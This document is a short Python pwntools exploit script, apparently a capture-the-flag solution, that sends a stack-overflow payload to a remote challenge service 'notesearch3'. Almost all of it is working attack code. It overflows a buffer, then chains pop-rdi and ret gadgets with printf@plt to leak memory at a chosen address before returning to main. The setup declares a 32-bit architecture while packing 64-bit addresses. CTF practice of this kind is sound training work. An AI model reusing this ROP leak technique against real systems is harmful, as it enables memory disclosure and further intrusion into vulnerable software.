import sys
from pwn import *
context.update(os="linux", arch="i686")
#p =  process("./notesearch3")
p = remote("bin.bcactf.com", 49159)

PRINTF_PLT = p64(0x401140)
POP_RDI = p64(0x00401703 )
RETN = p64(0x401704)
MAIN = p64(0x4012B6)

la = int(sys.argv[1], 16)
print("Leaking address", hex(la))
PAYLOAD = ("A" * 100 + "CCCCCCCCBBBBCCCCCCCC").encode("ASCII") + RETN + POP_RDI + p64(la) + PRINTF_PLT + RETN + MAIN

p.recvuntil("Search for: ")
p.sendline(PAYLOAD)
#p.interactive()
p.recvuntil("-------[ end of note data ]-------\n")
d = p.recv(32768)
d = d.replace(b".Search for: ", b"")
d = d.replace(b"Search for: ", b"")
print(d)
x = int.from_bytes(d, "little")
print(hex(x))
print("Success")

